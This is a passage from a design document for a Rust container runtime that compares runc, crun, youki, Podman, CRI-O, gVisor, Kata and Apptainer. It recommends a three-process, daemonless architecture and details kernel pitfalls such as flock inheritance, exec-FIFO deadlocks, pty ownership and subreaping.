flags.** A `clone` with namespace flags creates the namespaces in the child only, leaving the
supervisor's own context intact. This is the rule that keeps a two-process shape viable; break
it and a third process is forced back in.

#### (d) What *is* a Go artefact, exactly

| runc design element | Why it exists | Does a Rust runtime inherit it? |
|---|---|---|
| `runc init` — a re-exec of self **to enter namespaces** | Go's runtime is multithreaded from `main`; the kernel checks above reject it | **No.** |
| `nsexec.c` in C with `__attribute__((constructor))` | must run before the Go runtime spawns a thread | **No.** |
| netlink TLV bootstrap encoding | a C↔Go boundary needs a language-neutral wire format | **No** — same language both sides. |
| `setjmp`/`longjmp` staging | the C constructor must return control to Go exactly once, on the right stage | **No.** |
| `runc create` exiting after create | driven by the shim architecture, not by Go | **No** — our supervisor can stay. |
| A **fork** to become PID 1 of a new PID namespace | `pid_namespaces(7)`: `CLONE_NEWPID` affects children only; the creator can never be PID 1 | **Yes. Unavoidable, every language.** |
| A privileged process **outside** the new userns to write `uid_map`/`gid_map` | `user_namespaces(7)`: writing the map needs `CAP_SETUID`/`CAP_SETGID` in the parent userns | **Yes, when a userns is used.** |
| Applying the cgroup **before** the child can fork | otherwise the child's own children escape the cgroup for a window | **Yes** — but `clone3(CLONE_INTO_CGROUP)` (kernel ≥ 5.7) removes the race entirely. |
| Two processes: `create` parks init, `start` unparks it | **spec-mandated**, four clauses | **Yes.** |
| `PR_SET_CHILD_SUBREAPER` in the supervisor | needed because the process that `clone()`d init exits | **Conditionally no** — see 5.7 and 7.2. |

**Convention.** crun and youki are the evidence that the first five rows really are
language-imposed. crun's only `execv` calls are the user's program and the same for `crun
exec`; there is no `crun init`. youki likewise has no re-exec for namespace entry — the setup
runs in the cloned child directly. **Process counts for a detached create:** runc 5 including
the shim, crun 3, youki 3.

**Correction worth stating precisely, because the overstated version is tempting:** the Go
scaffolding is **two mechanisms**, not three — the `runc init` re-exec, and the
constructor/`longjmp`/TLV machinery, which is one mechanism with three visible parts — plus
one artefact of the shim architecture (`runc create` exiting). The simplification is real and
large; it is not "three of five".

**Convention.** youki keeps an intermediate process even though Rust does not force one, and
its reasons are kernel reasons rather than language reasons: the userns map-writing dance
needs a process that unshares the userns while a privileged process outside writes its maps,
and `CLONE_NEWPID` needs a fork. `youki@v0.7.0/crates/libcontainer/src/process/container_intermediate_process.rs#L203-214`
clones init with `CLONE_PARENT` **unconditionally**, so init's parent remains youki main and
youki never depends on reparenting at all.

**Fact — two kernel constraints on `CLONE_PARENT`, both worth designing around now.**
`torvalds/linux@v6.11/kernel/fork.c#L2162-2164`: `CLONE_PARENT` returns `EINVAL` if the caller
has `SIGNAL_UNKILLABLE` — a namespace's init cannot create siblings. (A process that has only
`unshare`d a PID namespace is fine, since `unshare(CLONE_NEWPID)` does not move the caller.)
`#L3043-3045` (`clone3_args_valid`): `clone3` rejects `CLONE_PARENT` together with a non-zero
`exit_signal`.

### 6.4 Trap: `/proc/self/exe` sealing is not optional, and not avoidable by design

**Trap.** *"We will design so our runtime never re-execs itself into the container, which
eliminates the CVE-2019-5736 class"* is **false**, and it is the most dangerous plausible
conclusion a reader can draw from 6.3.

**Fact.** CVE-2019-5736 is not about re-execing *into* a container. It is about a container
process obtaining a handle to `/proc/<runtime-pid>/exe` and **overwriting the host runtime
binary**, so that the **next** invocation of the runtime executes attacker code. Declining to
re-exec removes one route to that fd; it does not remove the exposure, because the host
binary's mapping is reachable for the whole setup window and a sufficiently privileged
container only needs to reach `/proc/self/exe`.

**Convention.** All three mature runtimes seal themselves at startup, before anything else
happens, in three different languages:

| Runtime | Mechanism | Location |
|---|---|---|
| runc | `cloned_binary.c`, `ensure_cloned_binary()` | C, pre-`main` |
| crun | `__attribute__((constructor)) static void libcrun_rexec(void)` → `ensure_cloned_binary()` | `crun@1.30.1/src/libcrun/linux.c#L7329-7337` |
| youki | `pentacle::ensure_sealed()` as the **first statement of `main()`**, before argument parsing | `youki@v0.7.0/crates/youki/src/main.rs#L65-76` |

crun's constructor is, specifically, the thing a casual read of "crun has no C constructor
trick" would miss: crun has no constructor *for namespace entry*, and has one *for sealing*.

**Recommendation.** Seal on line one of `main()`, unconditionally and before argument parsing:
`memfd_create(MFD_CLOEXEC|MFD_ALLOW_SEALING)`, copy our own binary into it, `F_ADD_SEALS`,
`fexecve` the memfd once. Roughly 60 lines. Do it early — retrofitting means auditing every
exec path in the codebase.

### 6.5 The other families — one idea each

Four families, distinguished by **where the supervisor sits relative to the client**.

| Family | Trust boundary | Supervisor | State of record | Built to solve |
|---|---|---|---|---|
| Daemon + shim (Docker, containerd) | the daemon's socket — a root-equivalent API | per-container or per-pod shim, ttrpc-addressable | boltdb `meta.db` + content store + `/run` bundles | many clients, one machine-wide authority, Kubernetes |
| Daemonless + shim (Podman, CRI-O) | the calling user's uid; no privileged API by default | `conmon`, one per container **and** one per `exec` | Podman: sqlite; CRI-O: per-container `state.json` | removing the root daemon as SPOF and attack surface |
| Sandboxed kernel (gVisor, Kata, Firecracker) | the Sentry, or the VM/EPT boundary | Sentry, or VMM + guest agent | slots into one of the families above | the host kernel's syscall surface is too large to trust |
| Exec-a-process (Apptainer) | the user's uid, unchanged | **none** — the container *is* your process | **none**, by design | running software as yourself on a shared FS you do not administer |

#### Podman + conmon — the daemonless supervisor

The one idea: **a supervisor that is a plain process with a file-and-pipe contract, not an RPC
service.**

**Convention.** The spawn sequence (`conmon@v2.2.1/src/conmon.c`, Podman's
`libpod/oci_conmon_*.go`): Podman writes its DB record and bundle, then `exec`s conmon with
the container id, runtime path, bundle, pidfile, `--exit-dir`, `--persist-dir`, a log target,
and an `--exit-command`. The sync and start pipes are
`socketpair(AF_LOCAL, SOCK_SEQPACKET|SOCK_CLOEXEC)` — not `pipe(2)` — so message boundaries
survive. conmon writes `-1000` to its own `/proc/self/oom_score_adj`, then **blocks reading
the start pipe**: *"Block for an initial write to the start pipe before spawning any children
or exiting, to ensure the parent can put us in the right cgroup."* Podman moves conmon into
its own scope, then writes the start byte. conmon double-forks, `setsid()`s, sets
`PR_SET_CHILD_SUBREAPER`, and only then creates anything.

**Recommendation.** That start-pipe handshake is the clean solution to "the supervisor must be
in a known cgroup before it forks anything", and it is better than the supervisor placing
itself, because the *caller* is the party that knows the cgroup policy. Worth copying the day
we put the supervisor in a cgroup of its own.

**Convention — three conmon details that each prevent a specific bug:**
- **A stderr pipe is always created, even in TTY mode** — *"because that way we can capture
  runc stderr messages before the tty is created"* (`conmon.c#L180`). The hardest thing to
  debug in a container runtime is a runtime that failed before it had anywhere to write.
- **The control FIFO is opened on both ends** — *"to prevent getting flood of POLLHUPs when
  last writer closes"* (`ctrl.c#L260-293`), and the read half is opened
  `O_RDONLY|O_NONBLOCK|O_CLOEXEC` **first**, then the write half `O_WRONLY|O_CLOEXEC`. That
  ordering is the only one that cannot block, per `fifo(7)`.
- **`sockaddr_un.sun_path` is 108 bytes including the NUL.** conmon works around it by opening
  the parent directory `O_PATH` and binding relative to it through `/proc/self/fd`, with a
  symlink-shortening fallback. A per-container socket at
  `/var/lib/mydocker/containers/<64-hex>/attach.sock` is 105 characters — it fits, with two
  bytes of headroom, and survives neither a prefix nor a test directory nor a non-default
  root.

**Convention.** conmon's attach framing is a **1-byte stream tag** over `SOCK_SEQPACKET`
(`stdin=1, stdout=2, stderr=3`), with resize travelling the other way as `"<type> <h> <w>\n"`
written into a control FIFO. Because SEQPACKET preserves message boundaries, no length field
is needed — which is why Docker's 8-byte length-prefixed framing exists and conmon's does not.
The one cost: `SOCK_SEQPACKET` has a maximum datagram size, so an attach implementation must
chunk.

**Convention.** `podman ps` reads sqlite and reconciles each container against `crun state`
and conmon's exit files. No daemon is consulted; two concurrent `podman` processes coordinate
purely through file locks. Reboot detection is an `alive` file in a tmpfs directory: if it is
absent, Podman resets all container states because *"it is safe to assume there are no
containers running."*

**Recommendation.** Record the **boot id** (`/proc/sys/kernel/random/boot_id`, a per-boot
random UUID per `proc(5)`) in the state file at every transition instead. It answers the
actual question — "did the host reboot since this was written" — rather than proxying it
through "did tmpfs get wiped", and it keeps working if state lives on persistent disk.

#### CRI-O — the state model

The one idea: **hundreds of production containers per node, atomic-rename `state.json` files,
no database.**

**Convention.** CRI-O has no metadata store. `internal/lib/container_server.go`'s
`ContainerStateToDisk` writes through an atomic file writer to
`<container dir>/state.json`; on restart, `LoadSandbox`/`LoadContainer` walk the container
directories, read the **OCI spec back off disk**, and restore volumes and ID mappings **from
the spec itself**. Every in-memory index is rebuilt from disk plus the runtime plus conmon's
exit files.

**Why this matters to us.** It is the strongest available evidence that a single-machine
engine needs no key-value store. Anyone arguing otherwise is importing containerd's
multi-tenant requirements. It also independently validates keeping a verbatim copy of
`config.json` next to the state file, because restoring from it is exactly what CRI-O does.

**Convention.** CRI-O exists solely to serve the kubelet's CRI; its own CLIs are *"only meant
for testing"*, it explicitly excludes building, signing and pushing images, and it tracks
Kubernetes minor releases. That bounded scope is why it can refuse the plugin system,
namespaces and metadata DB that containerd carries.

#### crun — C, no runtime threads

The one idea: **the error channel from a post-`clone` child is a fixed-size struct, written
once.**

**Convention.** `crun@1.30.1/src/libcrun/container.c#L71-102`:

```c
enum { SYNC_SOCKET_SYNC_MESSAGE, SYNC_SOCKET_ERROR_MESSAGE,
       SYNC_SOCKET_WARNING_MESSAGE, SYNC_SOCKET_DEBUG_MESSAGE };

struct sync_socket_message_s {
  int  type;
  int  error_value;
  char message[512];
};
```

written with a single `write()`. While in the child, crun redirects its **entire logging
output handler** into that socket (`crun_set_output_handler(log_write_to_sync_socket, …)`),
switching back to stderr only after the exec-FIFO wait.

**Why the shape is forced.** A child between `clone()` and `execve()` cannot safely allocate
(see 7.4), so a `String` error, a formatted message or a serializer are all unavailable. A
fixed-size `#[repr(C)]` record with a phase discriminant, an errno and a bounded message
buffer is the only design that reports a real error from a post-fork failure instead of
"child exited 1".

**Convention.** One more crun detail that is not obvious until it bites: `container_init()`
**reads its own host pid from the sync socket** as its first act, because once inside the PID
namespace `getpid()` returns 1 and `/proc/self` reports the namespace-local pid. A child that
needs its host pid — for a cgroup write, for an error message, for a `/proc/<hostpid>/…` path
the parent will use — must be told it by the parent.

**Convention.** At 1.30.1, crun applies the cgroup at clone time using `clone3` with
`CLONE_INTO_CGROUP` and a `clone()` fallback (`src/libcrun/linux.c#L6576-6596`) — so the
cgroup-race-free path is what the C implementation already ships.

#### youki — Rust, and where it simplified versus mirrored

**Simplified:** no re-exec for namespace entry; no C; no netlink TLV — four typed unidirectional
channels over socketpairs replace the hand-rolled encoding, carrying the same protocol shape
(`identifier_mapping_request` / `mapping_written`, `InitReady`, `SeccompNotify`) because the
underlying kernel constraints are identical.

**Mirrored:** three processes — main → intermediate → init — for the kernel reasons in 6.3(d),
not for language reasons; `CLONE_PARENT` on the intermediate→init clone, unconditionally.

**Convention — the one youki source file worth reading before writing any clone code** is
`crates/libcontainer/src/process/fork.rs`. It uses `clone3` as a raw syscall first with
`libc::clone` as a fallback, and states why it does not use the obvious Rust wrapper: *"The
nix wrapper also does not treat the closure memory correctly. The wrapper implementation fails
to pass the right ownership to the new child process."* The `libc::clone` fallback needs an
`mmap`'d stack with a guard page — *"we create a guard page of 1 page, to protect the child
stack collision"* — which is the single scariest piece of unsafe code in any of these
projects.

**Recommendation.** Require kernel ≥ 5.7 and use `clone3` only. That deletes the
caller-allocated stack, the guard page and the closure-pointer marshalling outright, and
`CLONE_INTO_CGROUP` comes with it. **Observation.** `clone3` is present on `host-a`
(kernel 6.11): `syscall(435, 0, 0)` returned `-1 EINVAL`, not `ENOSYS`. It is absent on a
kernel 4.18 host, so the fallback is not theoretical if EL8-era kernels ever matter — but our
stated target is a modern kernel, and stating the requirement is a defensible simplification
over writing the fallback.

#### gVisor and Kata/Firecracker — where the isolation boundary moved, and what it costs

**Convention — gVisor.** *"The application's direct interactions with the host System API are
intercepted by the Sentry, which implements the System API instead."* Three stated principles:
*"No system call is passed through directly to the host. Every supported call has an
independent implementation in the Sentry"*; *"Only common, universal functionality is
implemented"*; *"The host surface exposed to the Sentry is minimized."* Process shape: `runsc`
→ **Sentry** (a userspace guest kernel running in an empty mount namespace) + a separate
**Gofer** that owns filesystem access and passes fds into the sandbox over a socket. The
interception platform has been **systrap** (a `SECCOMP_RET_TRAP` filter delivering `SIGSYS` to
the offending thread) by default since mid-2023; the older ptrace platform is unsupported and
*"expected to eventually be removed entirely"* because of *"high context switch overhead"*.

**The cost, stated plainly:** every syscall is reimplemented, so syscall-heavy workloads pay
for it, and gVisor explicitly does not address hardware side-channels — *"gVisor relies on the
host operating system and the platform for defense against hardware-based attacks."*

**Convention — Kata.** `containerd-shim-kata-v2` implements the containerd shim-v2 contract
exactly and **never calls runc**: it boots a hypervisor and a VM per sandbox with a Rust
`kata-agent` inside as the container supervisor, talks to it over ttRPC on VSOCK (carrying the
container's I/O streams too), delivers the rootfs with virtio-fs and maps the guest kernel
with DAX. The trust boundary is the VM/EPT boundary.

**Fact.** The runtime spec's `vm` section (`config-vm.md`) standardizes the handoff —
`vm.hypervisor.path`, `vm.kernel.path`, `vm.image.path` with a required `format`
(`raw|qcow2|vdi|vmdk|vhd`) — but prescribes no runtime behaviour, which is why Kata configures
its hypervisor from its own TOML instead. It is OPTIONAL; ignoring it entirely is
spec-compliant.

**Recommendation.** Neither family's problem is ours — our threat model is "the user runs
their own images on their own machine". **But say so in the project's README rather than
implying otherwise: a namespace-based engine does not protect against a hostile image.**

**Recommendation.** Firecracker's `jailer` is worth reading as a 200-line executable
specification of "drop privileges, then exec": build `<chroot_base>/<exec_file>/<id>/root` and
`pivot_root()` into it; `mknod` and `chown` `/dev/kvm` inside; create the cgroup and write the
pid to `cgroup.procs`; `unshare()` for mounts and optionally `clone(CLONE_NEWPID)`; drop to an
unprivileged uid/gid; with `--daemonize`, `setsid()` and redirect stdio to `/dev/null`; then
`execv`. Use it as a cross-check against our own container-init ordering.

#### Apptainer — the fourth family, and which simplifications are principled

**Convention — the problem it solves.** A scientist has an image on a shared filesystem and an
allocation on a node they do not administer. They need the image's userspace, their own
identity, their own `$HOME`, GPUs and MPI, and they cannot be given a root socket or install
anything. *"When a user runs a container with Apptainer, it is started as a normal process
running under the user's account"* — there is no API surface to attack because there is no
service. The isolation invariant is enforced by `PR_NO_NEW_PRIVS` and `nosuid` mounts:
*"even if you run `sudo` inside your container, you won't be able to change to another user,
or gain root privileges by other means."*

**Convention — where PID 1 is: normally nowhere.** The final stage `execve`s your command in
the **host** PID namespace. It is a process in your session, visible in `ps`, reaped by your
shell, and **its exit code is your exit code**. With `--pid` a PID namespace is created and
the stage becomes PID 1, at which point Apptainer inserts a small init shim to reap zombies —
disabled by `--no-init`. **Observation.** `apptainer exec --help` on a Rocky 8.8 host lists
`--no-init  do NOT start shim process with --pid`.

**Convention — its master process is deliberately weaker than conmon.** It writes id maps,
holds FUSE mounts alive, and supervises instances. It holds **no** pty master, **no** log
file, **no** exit-status file and **no** attach socket — because your shell already holds the
tty, the exit status flows through `wait()`, and there is nothing to reconnect to.

**Convention — state: there isn't any.** The image is a file on the shared filesystem; "is it
running?" is answered by `ps` or the scheduler; resource limits are the scheduler's cgroup,
inherited untouched. The one exception is *instances*, which keep a per-user JSON directory in
`$HOME` and a log file pair, and which `exec instance://name` joins by `setns`.

**Principled — a general engine can and should adopt these:**

1. **The container is a process, not a service.** Foreground execution with the invoking
   process as supervisor needs no shim, no exit file, no attach socket and no reconnect
   protocol. Apptainer demonstrates that the 95% interactive case needs none of it.
2. **Exit status via `wait()`.** Podman's exit-file plus `--exit-command` plus inotify dance
   exists *only* because the supervisor must outlive the client.
3. **No metadata database on the common path.** Nothing to corrupt, no lock contention, no
   schema migration. CRI-O reached the same conclusion from the daemon side.
4. **Immutable, verifiable image; mount rather than unpack.** The SIF *format* is
   HPC-flavoured; "immutable image, signature travels with it, mount instead of unpack" is a
   general win.
5. **Isolation as opt-in, per namespace.** `--pid` / `--net` / `--ipc` / `--uts` / `--userns`
   independently. **Recommendation — directly actionable:** make each namespace a flag, and
   get `mydocker run` working with `--net=host` before writing a single line of networking.
   Docker's all-or-nothing default forces a network stack, a DNS server and a port proxy into
   existence before `hello-world` runs.
6. **Refuse to be a package manager.** Bounded scope is why it is one binary.
7. **`pivot_root`, never `chroot` — and verify it.** After joining a shared mount namespace,
   Apptainer's master compares `st_dev`/`st_ino` of `/` before and after and **aborts**,
   warning *"Running inside a weak chrooted environment, prefer pivot_root instead of
   chroot"*. A two-`stat` assertion that catches "we thought we pivoted and didn't". Add it.

**HPC-specific — do not generalize these:**

1. **Default-binding `$HOME`, `/tmp`, `$PWD`.** Correct only because the shared filesystem
   *is* the workflow; anywhere else it is a data-exfiltration default. Apptainer knows — that
   is what `--contain` is for.
2. **Passing the user's uid through unmapped.** Works because the host account model is
   authoritative across all nodes. An engine pulling from a public registry cannot assume the
   image's `USER 1000` means anything.
3. **No cgroups by default.** Works because the batch scheduler already placed the job in a
   cgroup. On a general single machine, no cgroup means one runaway container takes the box —
   and with cgroup v2 and root, this simplification is not available to us.
4. **No network isolation by default.** Works because MPI and InfiniBand want the host network
   and the fabric is the boundary.
5. **Trusted users.** The threat model is "the user could do this anyway as themselves" — true
   on a login node, false the moment you accept someone else's image.
6. **A setuid-root C binary as an acceptable option.** **Observation.** The Rocky 8.8 site
   probed here already agrees: `apptainer buildcfg | grep SUID` → `APPTAINER_SUID_INSTALL=0`,
   no `starter-suid` binary installed, and `/usr/bin/fusermount3` setuid instead. On a machine
   we control with cgroup v2 and a modern kernel, a setuid helper is liability with no upside.

**Convention — the one flag that tells the whole story.** `apptainer exec --compat` is
documented as *"apply settings for increased OCI/Docker compatibility. Infers --containall,
--no-init, --no-umask, --no-eval, --writable-tmpfs."* **Docker semantics are the opt-in;
isolation is what you pay extra for. Docker inverted that.**

---

## 7. Recommended architectural boundaries

**Three processes. One binary. No daemon. No RPC.** A transient CLI that exits; a per-container
supervisor that lives exactly as long as the container; a container init that is cloned by the
supervisor and `execve`s the user program. The CLI is never in the container's process
ancestry, and all coordination happens through the filesystem — a per-container directory, a
lock file, and a FIFO — not through a protocol.

The reasoning behind each deletion is in §6; this section is the resulting design, the
mechanics that are easy to get wrong, and what the design must not preclude.

### 7.1 The shape

```
mydocker run -d nginx                                 CLI — transient, exits
  1. seal /proc/self/exe into a memfd and re-exec once     (first line of main)
  2. resolve image, prepare rootfs, write bundle + config.json
  3. mkdir /var/lib/mydocker/containers/<id>              atomic; EEXIST = "id exists"
  4. open <dir>/lock O_RDWR|O_CLOEXEC ; flock(LOCK_EX)    <- O_CLOEXEC is load-bearing
  5. fork/exec self "supervise <id>", with a socketpair for the handshake
  6. read handshake: OK + init_pid, or a fixed-size error record
  7. print the id; exit 0                                 CLI leaves the ancestry
  |
  '--fork--> mydocker supervise <id>                 SUPERVISOR — outlives the CLI
               setsid()                              (tolerate EPERM; see 7.2)
               prctl(PR_SET_CHILD_SUBREAPER, 1)      for exec descendants only
               create the cgroup
               create stdio pipes, holding BOTH ends of each
               socketpair for the console master     <- never openpty()
               sigprocmask(SIGCHLD) -> signalfd
               clone3(CLONE_NEWPID|NEWNS|NEWUTS|NEWIPC|NEWNET[|NEWCGROUP]
                      + CLONE_INTO_CGROUP + CLONE_PIDFD)
               |
               '--child--> container init            PID 1 inside its own pidns
                             reset the signal mask to empty  <- before anything else
                             mount /proc /sys /dev /dev/pts
                             pivot_root; assert st_dev/st_ino of / changed
                             if terminal: open the container's /dev/pts/ptmx -> master
                                          TIOCGPTPEER -> slave
                                          send master out over the socketpair
                                          dup2 slave onto 0/1/2; setsid(); TIOCSCTTY
                             hostname, sysctls, rlimits
                             drop capabilities, seccomp, no_new_privs
                             open(exec.fifo, O_WRONLY)  <- BLOCKS until `start`
                             write one byte; close the O_PATH fd
                             execve(user program)
               supervisor then:
                             write state.json (status=created); reply OK; close handshake
                             poll { signalfd, pidfd, stdout pipe, stderr pipe, attach sock }
                             on exit: read the cgroup OOM counter, drain + flush the log,
                                      write state (exited, code, signal, oom_killed),
                                      fsync, tear down, exit
```

### 7.2 Five mechanics that are easy to get wrong

Each of these is a specific bug with a specific kernel reason, and each has an obvious-looking
implementation that is silently broken.

#### (1) The per-container lock must be opened `O_CLOEXEC`

**Fact.** `flock(2)`: *"Locks created by `flock()` are associated with an **open file
description** … duplicate file descriptors (created by, for example, `fork(2)` or `dup(2)`)
refer to the same lock … the lock is released either by an explicit `LOCK_UN` on **any** of
these duplicate file descriptors, **or when all such file descriptors have been closed**."*

A `flock` is therefore **not** released when *a* duplicate is closed. The naive sequence —
CLI takes the lock, CLI forks the supervisor, CLI closes the lock and exits — releases
nothing: the forked supervisor inherited a duplicate and holds the lock for the container's
entire lifetime. Every subsequent `start`, `kill`, `stop` and `rm` on that id then blocks
forever, or fails `EWOULDBLOCK` with `LOCK_NB`.

**Recommendation.** Open the lock file `O_CLOEXEC`, so `execve` of the supervisor drops it.
If the supervisor is ever reached by `fork` **without** `exec`, `O_CLOEXEC` does not apply and
the child must `close()` the fd explicitly. The failure is total, silent until the *second*
command, and invisible to any test that runs only one command — so it must be asserted, not
assumed.

**Fact.** Two further `flock` properties worth recording in the code comment: it is
**advisory only**, and *"If a process uses `open(2)` … to obtain more than one file descriptor
for the same file, these file descriptors are treated independently by `flock()`"* — so a
process that opens the lock file twice can **deadlock against itself**. One module owning the
open contains that.

**Recommendation.** No crate is needed: `std::fs::File::{lock, lock_shared, try_lock,
try_lock_shared, unlock}` are stable since Rust 1.89.0 and documented as corresponding to
`flock` with `LOCK_EX`. One Rust-specific lifetime trap: `File::open(p)?.lock()?` as a
statement drops the temporary `File` at the semicolon and releases the lock immediately. Bind
it to a named variable that outlives the critical section.

#### (2) `start` must not block on `exec.fifo` while holding the lock

**Fact.** `fifo(7)`: `open(O_WRONLY)` on a FIFO blocks until a reader opens, and `open(O_RDONLY)`
blocks until a writer opens — but `O_RDONLY|O_NONBLOCK` *"succeeds even if no one has opened
on the write side yet."*

The naive `start` — take the lock, open `exec.fifo` `O_RDONLY`, read one byte — deadlocks
whenever the container init died between `create` and `start`. That is trivially reachable:
the user's binary does not exist, or the cgroup OOM-killed init during setup. No writer will
ever appear, `start` blocks inside `open()` forever, **and it is holding the per-container
exclusive lock**, which wedges `kill`, `delete` and `rm` on the same container.

**Convention.** runc has guarded this since 2019 (`opencontainers/runc@8541d9cf3d8b`, *"Fix
race checking for process exit and waiting for exec fifo"*). At `v1.5.2` it does the blocking
open on a goroutine while the main loop wakes every 100 ms and `stat`s the init pid,
retrying the open with `O_NONBLOCK` on the bail-out path to pick up a byte a dying process may
already have written.

**Recommendation.** Open the read side `O_RDONLY|O_NONBLOCK` and `poll()` it **together with a
pidfd for the init process**. `POLLIN` on the FIFO means started; `POLLIN` on the pidfd means
init died first, and `start` fails with a real reason instead of hanging. No background
thread, no 100 ms wakeups, no PID-reuse window. The pidfd comes for free from
`clone3(CLONE_PIDFD)` at create time; for a `start` in a separate process invocation, from
`pidfd_open(init_pid)` guarded by the start-time check.

#### (3) The pty is allocated in the container init, never in the supervisor

**Convention.** runc allocates the pseudo-terminal **inside the container init**, from the
**container's own namespaced `/dev/pts/ptmx`**. `runc@v1.5.2/docs/terminals.md`: *"`runc` will
create a brand-new 'console' (or more precisely, a new pseudo-terminal using the container's
namespaced `/dev/pts/ptmx`)"*. The source confirms the actor:
`runc@v1.5.2/libcontainer/standard_init_linux.go#L96-106` calls `setupConsole(...)` then
`system.Setctty()` from inside init, and `console_linux.go#L22-42`'s `checkPtmxHandle`
*verifies* the handle is on a real `DEVPTS_SUPER_MAGIC` mount with inode 2 — i.e. it insists
on a devpts `ptmx` and rejects anything else.

The corrected protocol:

```
caller:    socket(AF_UNIX, SOCK_STREAM); bind(path); listen()
caller:    exec runtime create --console-socket path ...
init:      (inside the container mnt ns, after /dev/pts is mounted)
             open(container's /dev/pts/ptmx)            -> master
             TIOCGPTPEER (fallback: TIOCGPTN + open /dev/pts/N) -> slave
             sendmsg(console_socket, SCM_RIGHTS, [master])
             dup2(slave, 0/1/2); setsid(); ioctl(TIOCSCTTY)
runtime:   exits
caller:    recvmsg() -> master. Sole owner from here on.
```

**Recommendation.** **The supervisor must never call `openpty()`.** Allocating on the host's
`/dev/ptmx` hands the container a host pts device that then has to be bind-mounted in,
defeating the container's own devpts instance; it makes the pty's lifetime depend on a host
mount rather than on the container; and it collides with `setsid()` as follows.

**Fact — the collision.** `credentials(7)`: *"The controlling terminal is established when the
session leader first opens a terminal (**unless the `O_NOCTTY` flag is specified**) … A
terminal may be the controlling terminal of at most one session."* `TIOCSCTTY(2const)`: *"The
calling process must be a session leader and **not have a controlling terminal already** … If
this terminal is already the controlling terminal of a different session group, then the ioctl
fails with `EPERM`."* A supervisor that called `setsid()` is a session leader **with no
controlling terminal** — exactly the state in which the next tty it opens is silently claimed
as its ctty. The container's subsequent `setsid()` + `TIOCSCTTY` then fails `EPERM`.

**Recommendation.** **Any pty fd the supervisor touches must be opened `O_NOCTTY`.** glibc's
`openpty(3)` passes it; a hand-rolled `open(ptsname(m))` or a thin pty crate may not. This is
a real, silent, environment-dependent bug.

**Fact.** In new-terminal mode all three of the container's stdio fds refer to the **same**
file, so stdout and stderr cannot be distinguished. That is why Docker's 8-byte `stdcopy`
framing exists only for `terminal: false`.

**Fact.** `setsid(2)` fails `EPERM` if the caller is already a process-group leader — which is
why the idiom is `fork(); if (child) setsid();`. A `mydocker supervise` run directly from an
interactive shell **is** a process-group leader and the `setsid()` will fail. Tolerate the
error, or always re-fork.

**Fact.** The payoff from `setsid()` is precise: terminal hangup sends `SIGHUP` to the session
leader of the session that terminal controls, and a supervisor in its own session with no
controlling terminal cannot receive it. Conversely, when a session leader terminates, `SIGHUP`
goes to the foreground process group of *its* controlling terminal — and a supervisor with no
controlling terminal `SIGHUP`s nobody on the way out.

#### (4) `PR_SET_CHILD_SUBREAPER` is kept, but for a different reason than usually given

**Fact.** `torvalds/linux@v6.11/kernel/exit.c#L625-658` (`find_new_reaper`) walks ancestors
looking for a subreaper only while `task_pid(reaper)->level == ns_level` — **the search never
crosses a PID namespace boundary**. `pid_namespaces(7)` states the rule: an orphan is
reparented to the init process *"in the PID namespace of its parent"*, unless a nearer
ancestor **in that namespace** is a subreaper. containerd documents the practical consequence
independently (`containerd@v2.4.2/docs/runtime-v2.md`): *"Assume that container is in
X-namespace and P in root-namespace `setns` into X-namespace. P forks child C. The child C
forks a grandchild G and exits. The G will be reparented to X instead of P's reaper."*

Consequences for a supervisor that clones init directly:

- **For the container's own exit code the flag does nothing.** The supervisor is init's direct
  parent, and a direct child is never reparented while its parent lives.
- **For zombies inside the container the flag does nothing, ever.** Their parents are in the
  container's PID namespace, so they reparent to the container's PID 1. No host-side flag
  reaches them. (And when a pidns init dies, the kernel `SIGKILL`s the whole namespace, so
  nothing survives to be adopted.)
- **For `exec` descendants the flag is the whole mechanism.** `exec` implemented as
  *supervisor → fork → `setns`(pidns) → fork → `execve`* leaves the grandchild orphaned into
  the **host's** PID 1 when the middle process exits, because the dying parent was in the
  host pidns — unless the supervisor is a subreaper.
- **For `--pid=host` containers the flag is the whole mechanism**, since every container
  process is then in our pidns.

**Recommendation.** Keep the flag — one syscall, no downside — and state the correct reason in
the code comment, because a future reader who re-derives from the wrong reason will reach a
wrong conclusion somewhere else.

**Recommendation.** Pair it with `CLONE_PARENT` the day an intermediate process exists.
`CLONE_PARENT` (`torvalds/linux@v6.11/kernel/fork.c#L2502-2512`: *"CLONE_PARENT re-uses the
old parent"*, `p->real_parent = current->real_parent`) means never losing the parent in the
first place; subreaping is reparenting after the fact. youki's intermediate clones init with
`CLONE_PARENT` unconditionally for exactly this reason. Two kernel constraints to design
around: `CLONE_PARENT` is `EINVAL` from a process with `SIGNAL_UNKILLABLE` — a namespace init
cannot create siblings (`fork.c#L2162-2164`) — and `clone3` rejects `CLONE_PARENT` together
with a non-zero `exit_signal` (`fork.c#L3043-3045`).

**Convention.** A subreaper is a mode, not a set-and-forget flag:
`conmon@v2.2.1/src/ctr_exit.c#L166-174` turns its own off before double-forking its exit
command, *"as that would prevent double-fork from doing its job."* If our supervisor ever
forks a teardown helper it wants orphaned, the same applies.

#### (5) A failed `create` cleans up by calling our own forced `delete`

**Convention.** Both reference implementations do exactly this.
`runc@v1.5.2/utils_linux.go#L222-228` defers `r.destroy()` on error (gated by a `--keep`
escape hatch so an operator can inspect the corpse), and `#L315-321` routes it to
`container.Destroy()`. `crun@1.30.1/src/libcrun/container.c` calls
`force_delete_container_status()` — which is `container_delete_internal(..., force=true, ...)`
at `#L2830-2833` — on every failure path of `libcrun_container_create()` (`#L3004`, `#L3057`),
and when the detached child reports a non-zero code the parent runs
`libcrun_container_delete(..., force=true, ...)` with the log line *"Exit code is `%d`,
deleting container"* (`#L3034-3037`).

**Recommendation.** Make this structural: `create`'s rollback and `delete` are the same
function, differing only in where they start. Separate implementations will diverge and the
divergence will be a leak.

**Recommendation.** Do **not** persist an acquisition journal to make rollback survivable
across a supervisor death. Nothing in the ecosystem does. Both reference runtimes re-derive
what to undo from the state file plus a **verbatim copy of `config.json`** kept beside it, and
CRI-O restores volumes and ID mappings from the spec the same way on restart. Keep an in-memory
ordered cleanup list for the in-process case; make `delete --force` idempotent and derivable
from `state.json` + `config.json`. The journal is additive if a leak class later proves
undiagnosable.

**Recommendation.** Read the cgroup's OOM counter before reporting a creation failure. "Container
creation failed" with no reason is the most common unhelpful container error; reading the
counter is nearly free and turns it into a diagnosis. runc does exactly this, annotating the
error as *"container init was OOM-killed"*. The parent's fallback chain when a child dies with
no error record: the cgroup's `memory.events` `oom_kill` count → `WIFSIGNALED` → the child's
log pipe contents → "exit 1".

### 7.3 Every operation, and what it costs

| Operation | Mechanism | IPC? |
|---|---|---|
